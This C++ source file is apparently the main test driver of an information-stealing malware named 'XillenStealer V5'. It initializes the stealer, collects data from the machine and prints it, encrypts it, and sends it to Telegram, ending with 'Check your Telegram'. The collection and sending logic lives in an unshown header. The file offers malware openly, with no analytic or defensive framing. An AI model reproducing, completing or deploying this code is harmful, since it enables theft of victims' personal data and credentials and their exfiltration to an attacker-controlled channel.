#include "stealer.h"
#include <iostream>
#include <Windows.h>

int main() {
    SetConsoleOutputCP(CP_UTF8);
    
    std::cout << "XillenStealer V5 C++ Test\n";
    std::cout << "==========================\n\n";
    
    XillenStealer stealer;
    
    std::cout << "[*] Initializing...\n";
    if (!stealer.Initialize()) {
        std::cout << "[!] Initialization failed\n";
        return 1;
    }
    
    std::cout << "[*] Collecting data...\n";
    if (!stealer.CollectData()) {
        std::cout << "[!] Collection failed\n";
        return 1;
    }
    
    std::cout << "\n[+] Collected Data:\n";
    std::cout << "==================\n";
    std::cout << stealer.GetCollectedData() << "\n";
    
    std::cout << "\n[*] Processing data...\n";
    if (!stealer.ProcessAndEncrypt()) {
        std::cout << "[!] Processing failed\n";
        return 1;
    }
    
    std::cout << "[*] Sending to Telegram...\n";
    if (!stealer.SendData()) {
        std::cout << "[!] Send failed\n";
        return 1;
    }
    
    std::cout << "\n[+] Done! Check your Telegram\n";
    return 0;
}
